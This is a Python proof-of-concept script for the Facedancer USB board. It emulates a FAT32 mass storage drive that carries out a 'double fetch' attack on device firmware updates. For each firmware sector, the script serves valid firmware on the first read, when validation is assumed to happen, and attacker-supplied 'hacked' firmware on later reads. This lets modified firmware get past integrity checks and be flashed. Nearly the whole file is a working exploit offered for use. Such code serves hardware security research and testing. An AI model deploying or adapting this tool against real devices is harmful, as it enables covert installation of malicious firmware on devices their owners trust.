#!/usr/bin/env python3
#
# facedancer-ums-doublefetc.py
#
# "Double fetch" proof-of-concept for Facedancer
#

import re
import sys
import math

from facedancer import FacedancerUSBApp
from USBMassStorage import *

class DoubleFetchImage(FAT32DiskImage):

    FIRMWARE_IMAGE_START = 10147  # specified by our root directory entry

    def __init__(self, valid_firmware_filename, hacked_firmware_filename, verbose=0):

        # Store the filename for our valid firmware, which we'll present to the target.
        self.firmware_filename = valid_firmware_filename

        # Store copies of both of our firmware images. For now, we assume these are small enough
        # to fit nicely in memory.
        with open(valid_firmware_filename, 'rb') as f:
            self.valid_firmware = f.read()
        with open(hacked_firmware_filename, 'rb') as f:
            self.hacked_firmware = f.read()

        # TODO: Compute our size automatically to fit the firmware image?
        size = 1024 * 1024 * 256 # 256 MiB

        # Track the read count for each sector; this will be used for our double fetching.
        self.sector_read_counts = {}

        # Call into our parent constructor.
        super().__init__(size, verbose)


    def _initialize_sector_handlers(self):
        super()._initialize_sector_handlers()

        # Handler for firmware file reads...
        firmware_end = self.FIRMWARE_IMAGE_START + self._sectors_in_firmware_file()
        self._register_sector_handler(lambda x : x >= self.FIRMWARE_IMAGE_START and x < firmware_end, "Firmware Image", self.handle_fw_read)


    def _clusters_in_firmware_file(self):
        """
        Returns the number of clusters necessary to represent the given firmware file.
        """

        # Compute the number of clusters required to contain the firmware file.
        clusters = len(self.valid_firmware) / self.CLUSTER_SIZE
        return int(math.ceil(clusters))


    def _sectors_in_firmware_file(self):
        """
        Returns the number of sectors necessary to represent the given firmware file.
        """

        # Compute the number of clusters required to contain the firmware file.
        sectors = len(self.valid_firmware) / self.get_sector_size()
        return int(math.ceil(sectors))


    def handle_root_dir_read(self, address):
        """
            Returns a valid entry describing the root directory of our FAT filesystem.
            This allows us to present out firmware file to the target.
        """


        def bytes_as_hex(b, delim=" "):
            return delim.join(["%02x" % x for x in b])

        # Generate the volume label entry.
        response = self._generate_directory_entry(b'Facedancer ', 0, 0, flags=b'\x08')

        # Return a directory entry indicating our target firmware file.
        short_filename = self._short_filename_from_long(self.firmware_filename)
        response += self._generate_long_directory_entries(self.firmware_filename, short_filename)
        response += self._generate_directory_entry(short_filename, len(self.valid_firmware), 3)

        return response


    def handle_fat_read(self, address):
        """
        Handles an access to the device's file allocaiton table.
        """

        offset_into_fat = address - self.FAT_START
        clusters_per_fat_sector = int(self.get_sector_size() / 4)
        fw_clusters_in_this_sector = 128
        response = b''

        # Determine the last sector of the firmware file, which is 3 more than the file's length.
        # (0/1 are not valid clusters; and 2 contains the root directory)
        last_cluster_of_fw_file = self._clusters_in_firmware_file() + 3

        # Compute the number of the first cluster in this FAT sector.
        first_cluster_in_fat_sector = (offset_into_fat * clusters_per_fat_sector)

        # Compute the amount of firmware clusters entries _starting_ at the given sector...
        clusters_past_this_sector =  last_cluster_of_fw_file - first_cluster_in_fat_sector

        # If this is the first sector, add our labels and root directory...
        if address == self.FAT_START:
            fw_clusters_in_this_sector = min(clusters_per_fat_sector - 3, clusters_past_this_sector)

            response  = b'\xF8\xFF\xFF\x0F' # media type = fat32 hard disk
            response += b'\xFF\xFF\xFF\x0F' # partition state
            response += b'\xFF\xFF\xFF\xFF' # root directory entry ends here
            response += self._generate_cluster_chain(first_cluster_in_fat_sector + 3, fw_clusters_in_this_sector)

            # TODO: handle firmware that ends in the first sector?

        # ... otherwise, just generate the FAT entries for our firmware.
        else:
            fw_clusters_in_this_sector = min(clusters_per_fat_sector, clusters_past_this_sector)
            response = self._generate_cluster_chain(first_cluster_in_fat_sector, fw_clusters_in_this_sector)

            # If we've just finished a cluster chain, terminate it.
            if (fw_clusters_in_this_sector > 0) and (fw_clusters_in_this_sector < clusters_per_fat_sector):
                response += b"\xFF\xFF\xFF\xFF"

        return response


    def _generate_cluster_chain(self, start_address, count=128):
        """
        Generates a FAT cluster chain of sequential clusters _count_ long.
        Used to generate FAT entries for our firmware file.

        start_address: The address of the first cluster for which an entry is to be created.
        count: The number of clusters to be linked; defaults to a full block.
        """

        response = b''

        # Generate count entries, with each entry pointing directly to the next cluster.
        for i in range(start_address, start_address + count):
            next_sector = i + 1
            response += next_sector.to_bytes(4, byteorder='little')

        return response



    def handle_fw_read(self, address):
        """
        Handles reads of the firmware itself.
        """

        sector_size = self.get_sector_size()

        firmware_offset_sectors = address - self.FIRMWARE_IMAGE_START
        firmware_offset_bytes = firmware_offset_sectors * sector_size

        # On our first read, return the valid firmware image.
        # We assume this is the validation stage, so we provide all the correct firmware.
        if self.sector_read_counts[address] == 1:
            return self.valid_firmware[firmware_offset_bytes:firmware_offset_bytes+sector_size]
        # On subsequent reads, we return our hacked firmware.
        # We assume this is when the device is reading the data it wants to flash.
        else:
            return self.hacked_firmware[firmware_offset_bytes:firmware_offset_bytes+sector_size]


    def get_sector_data(self, address):
        """
        Fetches the data at the given sector of our emulated disk.
        """

        #
        # FIXME: reduce duplication
        #

        # Track the total number of reads to the given sector.
        if address not in self.sector_read_counts:
            self.sector_read_counts[address] = 1
        else:
            self.sector_read_counts[address] += 1

        result = super().get_sector_data(address)

        # If this is a handled sector, print how many times it's been read.
        if self.verbose > 1 and self._find_sector_handler(address):
            print("    [sector has been read {} times]".format(self.sector_read_counts[address]))

        return result


if len(sys.argv)==1:
    print("Usage: facedancer-ums-doublefetch.py valid_firmware hacked_firmware");
    sys.exit(1);

u = FacedancerUSBApp(verbose=0)
i = DoubleFetchImage(sys.argv[1], sys.argv[2], verbose=2)
d = USBMassStorageDevice(u, i, verbose=0)

d.connect()

try:
    d.run()
except KeyboardInterrupt:
    d.disconnect()
